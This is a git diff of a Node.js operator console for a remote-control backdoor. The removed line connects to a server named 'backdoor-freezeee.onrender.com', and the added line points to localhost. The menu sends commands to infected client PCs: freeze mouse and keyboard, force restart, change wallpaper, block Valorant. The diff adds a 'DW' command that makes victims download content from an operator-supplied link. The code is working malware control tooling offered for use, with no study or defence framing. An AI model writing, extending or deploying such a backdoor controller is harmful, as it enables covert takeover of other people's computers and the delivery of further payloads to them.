@@ -1,9 +1,9 @@
 const WebSocket = require("ws"); // CJS Only for packing (pkg)
 const readline = require("readline");
 
-const ws = new WebSocket("wss://backdoor-freezeee.onrender.com");
+const ws = new WebSocket("ws://localhost:8602");
 
-const optionsTable = `M - Freeze Mouse         K - Freeze Keyboard\nUM - Unfreeze Mouse      UK - Unfreeze Keyboard\nI - Image                CW - Change Wallpaper\nC - Calculator           FR - Force Restart\nSF - Safe Restart        AU - Audio\nBV - Block Valorant\nUV - Unblock Valorant\nCUI - COOK PC UI!!       BYE - Turns off a client\nT_(word)_secs - Puts a word on screen\n\nLC - List Clients\n\nIf want to send to all clients, then type: 'a|(command)|opc arg1)'`;
+const optionsTable = `M - Freeze Mouse         K - Freeze Keyboard\nUM - Unfreeze Mouse      UK - Unfreeze Keyboard\nI - Image                CW - Change Wallpaper\nC - Calculator           FR - Force Restart\nSF - Safe Restart        AU - Audio\nDW - Download something  BV - Block Valorant\nUV - Unblock Valorant    CUI - COOK PC UI!!\nBYE - Turns off a client\nT_(word)_secs - Puts a word on screen\n\nLC - List Clients\n\nIf want to send to all clients, then type: 'a|(command)|opc arg1)'`;
 
 const rl = readline.createInterface({
   input: process.stdin,
@@ -21,6 +21,7 @@ const commandsMap = {
   "AU": "AUDIO",
   "CW": "CHANGE_WALLPAPER",
   "T_": "TEXT_",
+  "DW": "DOWNLOAD",
   "FR": "FORCE_RESTART",
   "SF": "SAFE_RESTART",
   "BV": "BLOCK_VALORANT",
@@ -82,6 +83,12 @@ function connect() {
           sendString += ("_" + secs);
       }
       else if (arg1) sendString += "|" + arg1;
+
+      if (key === "DW" && !arg1)
+      {
+        console.log("Missing link for download.");
+        return;
+      }
 
       sendString = sendString.trim();
       console.log("Sent:", sendString);
